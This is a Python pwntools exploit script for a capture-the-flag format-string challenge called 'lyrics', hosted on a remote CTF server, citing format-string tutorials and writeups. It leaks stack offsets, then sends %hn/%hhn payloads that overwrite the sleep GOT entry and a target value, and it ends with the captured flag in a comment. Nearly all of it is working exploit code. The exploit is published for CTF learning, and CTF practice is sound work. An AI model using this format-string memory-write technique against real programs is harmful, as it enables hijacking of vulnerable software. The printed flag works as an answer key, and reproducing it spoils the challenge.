from pwn import *
# https://axcheron.github.io/exploit-101-format-strings/
# https://f3real.github.io/picoCTF_lvl3ConfigConsole.html
# https://ctftime.org/writeup/6323
# https://ctftime.org/writeup/26114

def main():
    LOCAL = False
    if LOCAL == True:
        elf = ELF('./lyrics')
        p = elf.process()
    else:
        p = remote('0.cloud.chals.io', 29376)
    
    # Step 1:
    # Involves finding where our arguments will be located on the stack
    # More specifically, this refers to the $ value
    p.recvuntil(">>> ")
    p.sendline("AAAA" + "%08x" * 100)
    step1_out = p.recvline().decode().split(" : AAAA")[1]
    print(step1_out)
    s1_arr = [step1_out[i:i+8] for i in range(0, len(step1_out), 8)]
    print(s1_arr)
    start_position = 0
    for i,v in enumerate(s1_arr):
        if v == '41414141':
            print(f'The position to start is: {i}')
            start_position = i+1
            break
    p.recvuntil(">>> ")
    # Note: the start position is 6

    # Step 2:
    sleep_addr = 0x405050
    win_addr = 0x4011e9
    problem_addr = 0x4050ac

    # payload = p64(sleep_addr) + "%6000c%6$hn".encode()
    # this should have been a successful write; if it wasn't then i would have seg faulted
    # payload =  p64(problem_addr) + b"%6000c%5$n"
    # payload = p64(0x7fffffffe278) + b"%6$n"
    # \x78\xe2\xff\xff\xff\x7f\x00\x00
    payload = b'AAAAAAAA%8$n' + p64(problem_addr) + p64(problem_addr) + p64(problem_addr)
    payload = b'A' * 8 + '%{0}c|%10$p|'.format(2493 - 6).rjust(16).encode() + p64(problem_addr) 
    payload = b'A' * 8 + b'%8$n'
    # AAAAAAAA%6$p%8$pBBBBBBBB
    problem_payload = b'A' * 96 + b'$p%19$nA' + p64(problem_addr)
    print('A' * 96 + '%$p%19$p' + 'B' * 8)
    # f = open('hexload.hex', 'wb')
    # f.write(payload)


    print('A' * 232 + '%36$p' + 'B' * 8)
    lower_payload = b'A' * 232 + b'$%36$hhn' + p64(sleep_addr)

    # print('A' * 232 + '%36$p' + 'B' * 8)
    # payload = b'A' * 232 + b'$p%36$hn' + p64(sleep_addr)

    print("Writing")
    sleep_addr_offset_addr = sleep_addr + 0x1
    # %$p%19$n
    upper_payload = b'A' * 16 + b'$%9$hhnA' + p64(sleep_addr_offset_addr)
    f = open('hexload.hex', 'wb')
    f.write(problem_payload)

    p.sendline(upper_payload)
    print("Sent upperpayload")
    p.recvuntil(">>> ")
    print("Sent lower payload")
    p.sendline(lower_payload)
    a = p.recvuntil(">>> ")
    print("Attempting to modify problem value")
    p.sendline(problem_payload)
    a = p.recvline()
    print(a)
    print(p.recvline())
    # print(p.recvline())
    p.interactive()
    # p.recvline()

    # uscg{u_c4n_p4y_f0r_sch00l_but_y0u_c4nt_buy_cl4ss}
    


if __name__ == '__main__':
    main()